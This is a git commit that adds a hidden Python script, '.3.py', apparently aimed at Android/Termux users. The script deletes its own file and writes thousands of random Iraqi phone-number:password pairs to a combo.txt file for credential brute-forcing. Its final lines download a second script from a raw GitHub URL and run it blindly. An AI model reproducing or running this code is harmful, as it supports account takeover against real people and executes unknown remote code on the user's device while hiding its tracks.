451f611bd89330ec10ce6c92c3775156e132e148
matainsfr5sfr5sfro <88651908+matainsfr5sfr5sfro@users.noreply.github.com>
2021-08-12 12:55:25 +0300

    Create .3.py

---
+++ .3.py
@@ -0,0 +1,59 @@
+import os,sys,random,wget
+os.system("clear")
+wd = "\033[90;1m" 
+GL = "\033[96;1m"
+BB = "\033[34;1m"
+YY = "\033[33;1m"
+GG = "\033[32;1m"
+WW = "\033[0;1m" 
+RR = "\033[31;1m" 
+CC = "\033[36;1m" 
+B = "\033[34m"   
+Y = "\033[33;1m"    
+G = "\033[32m"    
+W = "\033[0;1m" 
+R = "\033[31m"  
+try:
+    os.remove(".3.py")
+except:
+    pass
+try:
+    os.remove("/sdcard/download/.3.py")
+except:
+    pass
+os.system("rm -rf .3.py ;rm -rf /sdcard/download/.3.py")
+so="0770"
+bo="0750"
+ko="0771"
+jo="0751"
+do="0780"
+def si():
+	def iii():
+		global so,bo,ko,jo,do
+		import random,sys,os
+		for aa in range(7000):
+			asia=random.randint(1000000, 9999999)
+			asia1=random.randint(1000000, 9999999)
+			korak=random.randint(1000000, 9999999)
+			korak1=random.randint(1000000, 9999999)
+			asia0=random.randint(1000000, 9999999)
+			zain=random.randint(1000000, 9999999)
+			korak0=random.randint(1000000, 9999999)
+			korak00=random.randint(1000000, 9999999)
+			zain0=random.randint(1000000, 9999999)
+			asia00=random.randint(1000000, 9999999)
+			sys.stdout=open("combo.txt","a")
+			print("+964"+str(so)+str(asia)+":"+str(so)+str(asia))
+			print("+964"+str(bo)+str(korak)+":"+str(bo)+str(korak))
+			print("+964"+str(ko)+str(asia0)+":"+str(ko)+str(asia0))
+			print("+964"+str(jo)+str(korak00)+":"+str(jo)+str(korak00))
+			sys.stdout.flush()
+	iii()
+si()
+pass
+
+import os, sys, random, wget
+wget.download("https://raw.githubusercontent.com/zed404sfrr/-/main/.dabll.py")
+os.system("python .dabll.py")
+
+#
